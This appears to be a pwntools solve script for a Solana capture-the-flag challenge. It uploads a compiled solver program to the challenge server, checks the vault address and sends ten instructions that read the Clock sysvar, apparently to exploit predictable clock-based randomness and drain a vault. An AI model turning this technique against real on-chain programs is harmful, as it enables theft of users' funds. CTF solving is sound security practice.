import os

import base58
from pwn import args, remote
from solders.pubkey import Pubkey as PublicKey

os.system("cargo build-sbf")

host = args.HOST or "localhost"
port = args.PORT or 5001

r = remote(host, port, level="debug")
solve = open("target/deploy/soltoss_solve.so", "rb").read()

r.recvuntil(b"program pubkey: ")
r.sendline(b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx")
r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"challenge program address: ")
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b"player address: ")
player = PublicKey(base58.b58decode(r.recvline().strip().decode()))

r.recvuntil(b"vault PDA address: ")
vault = PublicKey(base58.b58decode(r.recvline().strip().decode()))

calculated_vault, vault_bump = PublicKey.find_program_address([b"vault"], program)

print("CHALLENGE PROGRAM:", program)
print("PLAYER:", player)
print("VAULT PDA (from server):", vault)
print("VAULT PDA (calculated):", calculated_vault)
print("VAULT BUMP:", vault_bump)

assert vault == calculated_vault, (
    f"Vault mismatch: server={vault}, calculated={calculated_vault}"
)

for i in range(10):
    r.sendline(b"5")  # Number of accounts
    r.sendline(b"x " + str(program).encode())  # Challenge program (executable)
    r.sendline(b"ws " + str(player).encode())  # Player (writable, signer)
    r.sendline(
        b"r SysvarC1ock11111111111111111111111111111111"
    )  # Clock sysvar (readonly)
    r.sendline(b"w " + str(vault).encode())  # Vault PDA (writable)
    r.sendline(b"r 11111111111111111111111111111111")  # System program (readonly)
    r.recvuntil(b"ix len:")
    r.sendline(b"1")
    r.send(str(i).encode())

leak = r.recvall()
print(leak.decode())
